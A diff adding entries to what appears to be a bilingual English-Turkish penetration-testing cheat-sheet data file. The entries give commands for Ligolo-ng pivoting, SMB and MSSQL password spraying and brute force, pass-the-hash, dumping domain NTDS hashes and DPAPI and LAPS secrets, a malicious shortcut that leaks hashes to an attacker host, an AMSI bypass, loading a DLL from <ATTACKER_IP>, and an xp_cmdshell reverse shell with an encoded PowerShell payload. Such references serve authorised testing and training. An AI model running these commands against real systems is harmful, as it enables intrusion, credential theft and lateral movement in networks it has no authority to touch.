@@ -10720,6 +10720,89 @@ module.exports = [
             ],
             "note": "Allows catching reverse shells through the tunnel",
             "desc_tr": "Ekle: a listener the agent for reverse connections üzerinde"
+          },
+          {
+            "title": "Ligolo-ng Windows Agent",
+            "desc": "Run agent on compromised Windows host",
+            "cmd": "agent.exe -connect <ATTACKER_IP>:11601 -ignore-cert",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "desc_tr": "Çalıştır: agent compromised Windows host üzerinde"
+          },
+          {
+            "title": "Ligolo-ng List Sessions",
+            "desc": "List active agent sessions in proxy console",
+            "cmd": "# In ligolo proxy console:\nsession",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Listele: aktif agent oturumları proxy konsolunda"
+          },
+          {
+            "title": "Ligolo-ng List Interfaces",
+            "desc": "Show network interfaces of connected agent",
+            "cmd": "# In ligolo proxy console (after selecting session):\nifconfig",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Göster: bağlı agent'ın ağ arayüzlerini"
+          },
+          {
+            "title": "Ligolo-ng Delete Route",
+            "desc": "Remove route when done with tunnel",
+            "cmd": "sudo ip route del <INTERNAL_SUBNET>/24 dev ligolo",
+            "tags": [
+              "tool"
+            ],
+            "desc_tr": "Sil: tünel bittiğinde route'u kaldır"
+          },
+          {
+            "title": "Ligolo-ng Double Pivot Setup",
+            "desc": "Add second TUN interface and route for double pivot",
+            "cmds": [
+              "sudo ip tuntap add user $(whoami) mode tun ligolo2",
+              "sudo ip link set ligolo2 up",
+              "sudo ip route add <SECOND_SUBNET>/24 dev ligolo2"
+            ],
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "desc_tr": "Çift pivot için ikinci TUN interface ve route ekle"
+          },
+          {
+            "title": "Ligolo-ng Stop Tunnel",
+            "desc": "Stop the active tunnel in proxy console",
+            "cmd": "# In ligolo proxy console:\nstop",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Aktif tüneli durdur proxy konsolunda"
+          },
+          {
+            "title": "Ligolo-ng Listener List",
+            "desc": "List all active listeners on agent",
+            "cmd": "# In ligolo proxy console:\nlistener_list",
+            "tags": [
+              "tool"
+            ],
+            "desc_tr": "Agent üzerindeki aktif listener'ları listele"
+          },
+          {
+            "title": "Ligolo-ng Transfer File via Listener",
+            "desc": "Use listener to serve files from attacker through pivot",
+            "cmds": [
+              "# On attacker: python3 -m http.server 8000",
+              "# In ligolo console: listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000 --tcp",
+              "# On internal host: curl http://<PIVOT_IP>:8000/file.exe -o file.exe"
+            ],
+            "tags": [
+              "advanced",
+              "tool"
+            ],
+            "desc_tr": "Listener ile pivot üzerinden dosya transfer et"
           }
         ],
         "name_tr": "Ligolo-ng"
@@ -10839,6 +10922,33 @@ module.exports = [
               "essential"
             ],
             "desc_tr": "CrackMapExec SOCKS üzerinden"
+          },
+          {
+            "title": "Proxychains NetExec MSSQL",
+            "desc": "Access internal MSSQL through SOCKS proxy with NetExec",
+            "cmd": "proxychains -q nxc mssql <INTERNAL_IP> -u <USER> -p '<PASS>'",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "SOCKS proxy ile dahili MSSQL'e NetExec üzerinden eriş"
+          },
+          {
+            "title": "Proxychains NetExec MSSQL Command",
+            "desc": "Execute OS command on internal MSSQL via proxy",
+            "cmd": "proxychains -q nxc mssql <INTERNAL_IP> -u <USER> -p '<PASS>' -x 'whoami'",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Proxy üzerinden dahili MSSQL'de OS komutu çalıştır"
+          },
+          {
+            "title": "Proxychains Impacket MSSQL",
+            "desc": "Connect to internal MSSQL with impacket through proxy",
+            "cmd": "proxychains -q impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<INTERNAL_IP> -windows-auth",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Proxy üzerinden dahili MSSQL'e impacket ile bağlan"
           }
         ],
         "name_tr": "SOCKS Proxying"
@@ -18540,6 +18650,201 @@ module.exports = [
             ],
             "note": "Pwn3d! = admin access confirmed",
             "desc_tr": "Kontrol et: if kimlik bilgileri have admaccess içinde"
+          },
+          {
+            "title": "NXC SMB Brute Force Single User",
+            "desc": "Brute force passwords for a single user",
+            "cmd": "nxc smb <TARGET_IP> -u <USER> -p passwords.txt --continue-on-success",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Tek kullanıcı için parola brute force"
+          },
+          {
+            "title": "NXC SMB Brute Force User + Pass Lists",
+            "desc": "Try all user/password combinations (brute force mode)",
+            "cmd": "nxc smb <TARGET_IP> -u users.txt -p passwords.txt --continue-on-success",
+            "tags": [
+              "essential"
+            ],
+            "note": "Without --no-bruteforce: tries every user with every password (N*M attempts)",
+            "desc_tr": "Tüm kullanıcı/parola kombinasyonlarını dene (brute force modu)"
+          },
+          {
+            "title": "NXC SMB Spray No Brute",
+            "desc": "Spray without brute force — match user1:pass1, user2:pass2 (1:1 mapping)",
+            "cmd": "nxc smb <TARGET_IP> -u users.txt -p passwords.txt --no-bruteforce --continue-on-success",
+            "tags": [
+              "essential"
+            ],
+            "note": "--no-bruteforce pairs each user with its corresponding password line by line",
+            "desc_tr": "Brute force olmadan spray — user1:pass1, user2:pass2 (1:1 eşleşme)"
+          },
+          {
+            "title": "NXC SMB Hash Spray",
+            "desc": "Spray NTLM hash against multiple users",
+            "cmd": "nxc smb <TARGET_IP> -u users.txt -H <NTLM_HASH> --continue-on-success",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "NTLM hash'i birden fazla kullanıcıya spray et"
+          },
+          {
+            "title": "NXC SMB Hash List Spray",
+            "desc": "Spray list of NTLM hashes against a user",
+            "cmd": "nxc smb <TARGET_IP> -u <USER> -H hashes.txt --continue-on-success",
+            "tags": [
+              "tool"
+            ],
+            "desc_tr": "NTLM hash listesini tek kullanıcıya spray et"
+          },
+          {
+            "title": "NXC SMB Subnet Spray",
+            "desc": "Password spray across entire subnet",
+            "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' --continue-on-success",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Tüm subnet'e password spray"
+          },
+          {
+            "title": "NXC SMB Spray from Targets File",
+            "desc": "Spray credentials against hosts from file",
+            "cmd": "nxc smb targets.txt -u <USER> -p '<PASS>' --continue-on-success",
+            "tags": [
+              "tool"
+            ],
+            "desc_tr": "Dosyadaki hedeflere credential spray"
+          },
+          {
+            "title": "NXC SMB Check Admin Subnet",
+            "desc": "Find all hosts where credentials have local admin",
+            "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' --continue-on-success",
+            "tags": [
+              "essential"
+            ],
+            "note": "Look for (Pwn3d!) in output to identify admin access",
+            "desc_tr": "Credential'ların local admin olduğu tüm host'ları bul"
+          },
+          {
+            "title": "NXC SMB Signing Check",
+            "desc": "Check SMB signing status across network (for relay attacks)",
+            "cmd": "nxc smb <SUBNET>/24 --gen-relay-list relay_targets.txt",
+            "tags": [
+              "essential"
+            ],
+            "note": "Hosts without SMB signing are vulnerable to NTLM relay",
+            "desc_tr": "Ağdaki SMB signing durumunu kontrol et (relay saldırıları için)"
+          },
+          {
+            "title": "NXC SMB Enumerate Shares (Spider)",
+            "desc": "Recursively spider all accessible shares for sensitive files",
+            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M spider_plus -o EXCLUDE_DIR=IPC$",
+            "tags": [
+              "essential"
+            ],
+            "note": "Output saved to /tmp/nxc_spider_plus/",
+            "desc_tr": "Erişilebilir share'leri hassas dosyalar için tara"
+          },
+          {
+            "title": "NXC SMB PtH Execute Command",
+            "desc": "Execute command using Pass the Hash",
+            "cmd": "nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -x 'whoami /all'",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Pass the Hash ile komut çalıştır"
+          },
+          {
+            "title": "NXC SMB PtH PowerShell",
+            "desc": "Run PowerShell command using Pass the Hash",
+            "cmd": "nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -X 'Get-Process'",
+            "tags": [
+              "tool"
+            ],
+            "desc_tr": "Pass the Hash ile PowerShell komutu çalıştır"
+          },
+          {
+            "title": "NXC SMB Domain Auth",
+            "desc": "Authenticate with explicit domain specification",
+            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Açık domain belirterek kimlik doğrulama"
+          },
+          {
+            "title": "NXC SMB Kerberos with CCACHE",
+            "desc": "Authenticate using Kerberos ccache ticket file",
+            "cmd": "export KRB5CCNAME=<USER>.ccache && nxc smb <TARGET_IP> -u <USER> -k --use-kcache",
+            "tags": [
+              "advanced"
+            ],
+            "desc_tr": "Kerberos ccache ticket dosyası ile kimlik doğrulama"
+          },
+          {
+            "title": "NXC SMB NTDS with Hash Auth",
+            "desc": "Dump entire domain hashes using Pass the Hash",
+            "cmd": "nxc smb <DC_IP> -u <USER> -H <NTLM_HASH> --ntds",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Pass the Hash ile tüm domain hash'lerini dökümle"
+          },
+          {
+            "title": "NXC SMB DPAPI Module",
+            "desc": "Extract DPAPI secrets (Chrome passwords, WiFi keys etc.)",
+            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M dpapi",
+            "tags": [
+              "advanced"
+            ],
+            "desc_tr": "DPAPI gizli bilgilerini çıkar (Chrome parolaları, WiFi anahtarları vb.)"
+          },
+          {
+            "title": "NXC SMB LAPS Reader",
+            "desc": "Read LAPS passwords from Active Directory",
+            "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' -M laps",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Active Directory'den LAPS parolalarını oku"
+          },
+          {
+            "title": "NXC SMB Enum AV",
+            "desc": "Enumerate installed antivirus on target",
+            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M enum_av",
+            "tags": [
+              "tool"
+            ],
+            "desc_tr": "Hedefte kurulu antivirüsü keşfet"
+          },
+          {
+            "title": "NXC SMB Bloodhound Collection",
+            "desc": "Collect BloodHound data via NetExec",
+            "cmd": "nxc ldap <DC_IP> -u <USER> -p '<PASS>' --bloodhound -ns <DC_IP> -c All",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "NetExec ile BloodHound verisi topla"
+          },
+          {
+            "title": "NXC SMB WebDAV Check",
+            "desc": "Check if WebDAV is enabled on targets",
+            "cmd": "nxc smb <SUBNET>/24 -u <USER> -p '<PASS>' -M webdav",
+            "tags": [
+              "tool"
+            ],
+            "desc_tr": "Hedeflerde WebDAV aktif mi kontrol et"
+          },
+          {
+            "title": "NXC SMB slinky Module",
+            "desc": "Create malicious shortcut (.lnk) on writable share for hash capture",
+            "cmd": "nxc smb <TARGET_IP> -u <USER> -p '<PASS>' -M slinky -o SERVER=<ATTACKER_IP> NAME=important",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Combine with Responder to capture hashes",
+            "desc_tr": "Yazılabilir share'de hash yakalama için kötü amaçlı shortcut (.lnk) oluştur"
           }
         ],
         "name_tr": "SMB Authentication & Exec"
@@ -18777,6 +19082,105 @@ module.exports = [
               "essential"
             ],
             "desc_tr": "Çalıştır: OS command xp_cmdshell üzerinden"
+          },
+          {
+            "title": "NXC MSSQL Windows Auth",
+            "desc": "Authenticate to MSSQL with Windows/Domain credentials",
+            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Windows/Domain kimlik bilgileri ile MSSQL'e bağlan"
+          },
+          {
+            "title": "NXC MSSQL Local Auth",
+            "desc": "Authenticate with SQL local account",
+            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' --local-auth",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "SQL yerel hesabı ile kimlik doğrulama"
+          },
+          {
+            "title": "NXC MSSQL Pass the Hash",
+            "desc": "Authenticate to MSSQL using NTLM hash",
+            "cmd": "nxc mssql <TARGET_IP> -u <USER> -H <NTLM_HASH>",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "NTLM hash ile MSSQL'e bağlan"
+          },
+          {
+            "title": "NXC MSSQL Enum Privileges",
+            "desc": "Check if current user is sysadmin",
+            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -q 'SELECT IS_SRVROLEMEMBER(\"sysadmin\")'",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Mevcut kullanıcının sysadmin olup olmadığını kontrol et"
+          },
+          {
+            "title": "NXC MSSQL Put File",
+            "desc": "Upload file to target via MSSQL",
+            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' --put-file /local/shell.exe 'C:\\Temp\\shell.exe'",
+            "tags": [
+              "advanced"
+            ],
+            "desc_tr": "MSSQL üzerinden hedefe dosya yükle"
+          },
+          {
+            "title": "NXC MSSQL Get File",
+            "desc": "Download file from target via MSSQL",
+            "cmd": "nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' --get-file 'C:\\Temp\\data.txt' /local/data.txt",
+            "tags": [
+              "advanced"
+            ],
+            "desc_tr": "MSSQL üzerinden hedeften dosya indir"
+          },
+          {
+            "title": "NXC MSSQL Password Spray",
+            "desc": "Spray passwords against MSSQL service",
+            "cmd": "nxc mssql <SUBNET>/24 -u users.txt -p '<PASS>' --continue-on-success",
+            "tags": [
+              "tool"
+            ],
+            "desc_tr": "MSSQL servisine password spray saldırısı"
+          },
+          {
+            "title": "Proxychains NXC MSSQL Auth",
+            "desc": "Authenticate to MSSQL through SOCKS proxy",
+            "cmd": "proxychains -q nxc mssql <TARGET_IP> -u <USER> -p '<PASS>'",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "SOCKS proxy üzerinden MSSQL'e kimlik doğrulama"
+          },
+          {
+            "title": "Proxychains NXC MSSQL Command Exec",
+            "desc": "Execute OS command on MSSQL through SOCKS proxy",
+            "cmd": "proxychains -q nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -x 'whoami'",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "SOCKS proxy üzerinden MSSQL'de OS komutu çalıştır"
+          },
+          {
+            "title": "Proxychains NXC MSSQL Query",
+            "desc": "Run SQL query on MSSQL through SOCKS proxy",
+            "cmd": "proxychains -q nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -q 'SELECT name FROM master.dbo.sysdatabases'",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "SOCKS proxy üzerinden MSSQL'de SQL sorgusu çalıştır"
+          },
+          {
+            "title": "Proxychains NXC MSSQL with Domain",
+            "desc": "Authenticate to MSSQL with domain credentials through proxy",
+            "cmd": "proxychains -q nxc mssql <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Proxy üzerinden domain kimlik bilgileri ile MSSQL'e bağlan"
           }
         ],
         "name_tr": "WinRM / LDAP / MSSQL"
@@ -19893,6 +20297,98 @@ module.exports = [
             "desc_tr": "Bağlan: as SA user"
           },
           {
+            "title": "Impacket MSSQL with DC-IP",
+            "desc": "Connect to MSSQL specifying Domain Controller IP for Kerberos/NTLM resolution",
+            "cmd": "impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET_IP> -dc-ip <DC_IP> -windows-auth",
+            "tags": [
+              "essential",
+              "tool"
+            ],
+            "desc_tr": "DC-IP belirterek MSSQL'e bağlan (Kerberos/NTLM çözümlemesi için)"
+          },
+          {
+            "title": "Impacket MSSQL with Hash",
+            "desc": "Connect to MSSQL using NTLM hash (Pass the Hash)",
+            "cmd": "impacket-mssqlclient <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH> -windows-auth",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "NTLM hash ile MSSQL'e bağlan (Pass the Hash)"
+          },
+          {
+            "title": "Impacket MSSQL Custom Port",
+            "desc": "Connect to MSSQL on non-default port",
+            "cmd": "impacket-mssqlclient <USER>:<PASS>@<TARGET_IP> -port <PORT>",
+            "tags": [
+              "tool"
+            ],
+            "desc_tr": "Varsayılan olmayan port üzerinden MSSQL'e bağlan"
+          },
+          {
+            "title": "Impacket MSSQL Kerberos Auth",
+            "desc": "Connect to MSSQL with Kerberos ticket",
+            "cmd": "export KRB5CCNAME=<USER>.ccache && impacket-mssqlclient -k <DOMAIN>/<USER>@<TARGET_FQDN> -dc-ip <DC_IP>",
+            "tags": [
+              "advanced"
+            ],
+            "desc_tr": "Kerberos ticket ile MSSQL'e bağlan"
+          },
+          {
+            "title": "MSSQL Enum Linked Servers",
+            "desc": "Enumerate linked SQL servers for lateral movement",
+            "cmds": [
+              "SELECT name, provider, data_source FROM sys.servers;",
+              "EXEC sp_linkedservers;"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Linked SQL server'ları keşfet (lateral movement için)"
+          },
+          {
+            "title": "MSSQL Execute on Linked Server",
+            "desc": "Execute query on linked server via OpenQuery",
+            "cmds": [
+              "SELECT * FROM OPENQUERY(\"<LINKED_SERVER>\", 'SELECT @@servername');",
+              "EXEC ('xp_cmdshell ''whoami''') AT [<LINKED_SERVER>];"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Linked server üzerinde sorgu çalıştır (OpenQuery ile)"
+          },
+          {
+            "title": "MSSQL Impersonate User",
+            "desc": "Check and impersonate another SQL user for privilege escalation",
+            "cmds": [
+              "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';",
+              "EXECUTE AS LOGIN = 'sa';",
+              "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "Başka bir SQL kullanıcısını impersonate et (yetki yükseltme)"
+          },
+          {
+            "title": "MSSQL Read File",
+            "desc": "Read local file via MSSQL bulk insert",
+            "cmd": "SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\System32\\drivers\\etc\\hosts', SINGLE_CLOB) AS Contents;",
+            "tags": [
+              "advanced"
+            ],
+            "desc_tr": "MSSQL bulk insert ile yerel dosya oku"
+          },
+          {
+            "title": "MSSQL Reverse Shell via xp_cmdshell",
+            "desc": "Get reverse shell through MSSQL xp_cmdshell",
+            "cmd": "EXEC xp_cmdshell 'powershell -e <BASE64_PAYLOAD>';",
+            "tags": [
+              "essential"
+            ],
+            "desc_tr": "xp_cmdshell üzerinden reverse shell al"
+          },
+          {
             "title": "MSSQL Enable xp_cmdshell",
             "desc": "Enable xp_cmdshell for OS command execution",
             "cmds": [
@@ -20485,6 +20981,121 @@ module.exports = [
             ],
             "note": "Run inside evil-winrm session",
             "desc_tr": "Çalıştır: a PowerShell script memory içinde"
+          },
+          {
+            "title": "Evil-WinRM Menu (In-Session)",
+            "desc": "Show all available Evil-WinRM built-in commands",
+            "cmd": "menu",
+            "tags": [
+              "essential"
+            ],
+            "note": "Run inside evil-winrm session",
+            "desc_tr": "Evil-WinRM yerleşik komutlarını listele"
+          },
+          {
+            "title": "Evil-WinRM Bypass AMSI (In-Session)",
+            "desc": "Bypass AMSI to run tools without AV detection",
+            "cmd": "Bypass-4MSI",
+            "tags": [
+              "essential"
+            ],
+            "note": "Run inside evil-winrm session — run before loading any tool",
+            "desc_tr": "AMSI bypass — AV tespiti olmadan araç çalıştırmak için"
+          },
+          {
+            "title": "Evil-WinRM Load DLL (In-Session)",
+            "desc": "Load a DLL into memory on the target",
+            "cmd": "Dll-Loader -http http://<ATTACKER_IP>/payload.dll",
+            "tags": [
+              "advanced"
+            ],
+            "note": "Run inside evil-winrm session",
+            "desc_tr": "Hedef üzerinde DLL'i belleğe yükle"
+          },
+          {
+            "title": "Evil-WinRM .NET Assembly (In-Session)",
+            "desc": "Execute .NET assembly (exe) in memory using Invoke-Binary",
+            "cmds": [
+              "# Start evil-winrm with -e flag pointing to exe folder:",
+              "# evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -e /path/to/exe/",
+              "Bypass-4MSI",
+              "Invoke-Binary /path/to/exe/Rubeus.exe kerberoast"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "note": "Run inside evil-winrm session — requires -e flag on connect",
+            "desc_tr": ".NET assembly (exe) bellek içinde çalıştır"
+          },
+          {
+            "title": "Evil-WinRM Load PS Script (In-Session)",
+            "desc": "Load PowerShell script into session and invoke function",
+            "cmds": [
+              "# Start evil-winrm with -s flag pointing to script folder:",
+              "# evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -s /path/to/scripts/",
+              "Bypass-4MSI",
+              "PowerView.ps1",
+              "Get-DomainUser -Identity <USER>"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "note": "Run inside evil-winrm session — requires -s flag on connect. Type script name to load, then call functions",
+            "desc_tr": "PS script'i session'a yükle ve fonksiyonları çağır"
+          },
+          {
+            "title": "Evil-WinRM Services (In-Session)",
+            "desc": "List Windows services from session",
+            "cmd": "services",
+            "tags": [
+              "essential"
+            ],
+            "note": "Run inside evil-winrm session",
+            "desc_tr": "Windows servislerini listele"
+          },
+          {
+            "title": "Evil-WinRM Post-Connect Recon (In-Session)",
+            "desc": "Initial reconnaissance commands after Evil-WinRM connection",
+            "cmds": [
+              "whoami /all",
+              "hostname",
+              "ipconfig /all",
+              "net user",
+              "net localgroup Administrators",
+              "systeminfo"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "note": "Run inside evil-winrm session",
+            "desc_tr": "Evil-WinRM bağlantısından sonra ilk keşif komutları"
+          },
+          {
+            "title": "Evil-WinRM WinPEAS from Session",
+            "desc": "Upload and run WinPEAS for privilege escalation enumeration",
+            "cmds": [
+              "upload /path/to/winPEASx64.exe C:\\Windows\\Temp\\winPEASx64.exe",
+              "C:\\Windows\\Temp\\winPEASx64.exe"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "note": "Run inside evil-winrm session",
+            "desc_tr": "WinPEAS yükle ve çalıştır (yetki yükseltme keşfi)"
+          },
+          {
+            "title": "Evil-WinRM SharpHound from Session",
+            "desc": "Upload and run SharpHound for BloodHound collection",
+            "cmds": [
+              "upload /path/to/SharpHound.exe C:\\Windows\\Temp\\SharpHound.exe",
+              "C:\\Windows\\Temp\\SharpHound.exe -c All",
+              "download C:\\Windows\\Temp\\*_BloodHound.zip /local/path/"
+            ],
+            "tags": [
+              "essential"
+            ],
+            "note": "Run inside evil-winrm session",
+            "desc_tr": "SharpHound yükle ve çalıştır (BloodHound veri toplama)"
           }
         ],
         "name_tr": "WinRM (5985/5986)"
